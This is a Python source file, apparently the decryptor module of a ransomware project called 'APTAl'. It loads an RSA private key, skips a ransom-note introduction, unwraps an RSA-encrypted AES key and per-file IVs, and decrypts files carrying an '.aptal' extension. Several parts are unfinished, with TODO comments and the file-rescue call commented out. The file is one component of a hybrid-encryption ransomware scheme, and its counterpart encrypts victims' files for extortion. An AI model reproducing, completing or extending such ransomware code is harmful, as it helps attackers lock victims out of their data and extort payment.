import os
import sys
import base64

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
from RSACipher import RSACipher


def aboutAPTAl():
    print(""" who we are, explain our purpose and give an advice""")

def openthelock():
    """
        TODO Explain Function
    """
    print("Begin to DECRYPT the Encrypted IVs")

    rsa_private_key = open(Utils.rsa_private_key_path,"rb").read()
    rsa_cipher = RSACipher(rsa_private_key)

    # TODO -> determine the line 
    pass_the_introduction = 1 #Utils.who_we_are
    pass_the_introduction += len(Utils.what_is_my_purpose.split("\n"))-2
    
    with open(Utils.enc_aesIV_file_store_path,"rb") as ivs_file:
        
        for i in range(pass_the_introduction):
            _temp = ivs_file.readline()
            #  print(">>>>",_temp)

        with open(Utils.dec_aesIV_file_store_path,"wb") as dec_ivs_file:

            aes_key = ivs_file.readline().strip()
            # print("base64(aes(Key)):",aes_key,"Will decrypt")
            aes_key = base64.b64decode(aes_key)
            # print("(aes(Key):",aes_key,"will decrypt")
            aes_key = rsa_cipher.decrypt(aes_key)
            # print("AES_key:", aes_key)
            # dec_ivs_file.write(aes_key)
            # decrypt aes key

            for line in ivs_file.readlines():
                iv, which_file = line.strip().split(b":::::")
                # print("\tBASE64(rsa(IV)):",iv,":::",which_file,"will decrypt")
                iv = rsa_cipher.decrypt(base64.b64decode(iv.decode()))
                which_file = rsa_cipher.decrypt(base64.b64decode(which_file.decode("utf-8")))
                # print("\trsa(IV):",iv,":::",which_file,"will decrypt")
                dec_ivs_file.write(iv+b":::::"+which_file+b"\n")
                # Decrypt iv and path with given RSA private key than write thedecrypted pairs to Utils.dec_aesIV_file_store_path

def decryptFile(cipher,iv,file_path):
    decrypted_file_path = file_path[:-6]
    chunk_size = 16*1024
    with open(file_path, 'rb') as infile:
        with open(decrypted_file_path, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(cipher.decrypt(iv, chunk))
    
    # os.remove(file_path) # deleting .aptal file

def startRescueFiles():
    """
        TODO Explain Function
    """
    print("Begin to DECRYPT the Files")

    with open(Utils.dec_aesIV_file_store_path,"rb") as ivs_file:

        aes_key = ivs_file.readline().strip()
        cipher = AESCipher(aes_key)

        for line in ivs_file.readlines():
            iv, which_file = line.strip().split(b":::::")
            print(iv,which_file)
            decryptFile(cipher,iv,which_file)
            # Decrypt the encrypted files

def main():
    
    aboutAPTAl()
    openthelock()
    #startRescueFiles()


if __name__ == "__main__":
    main()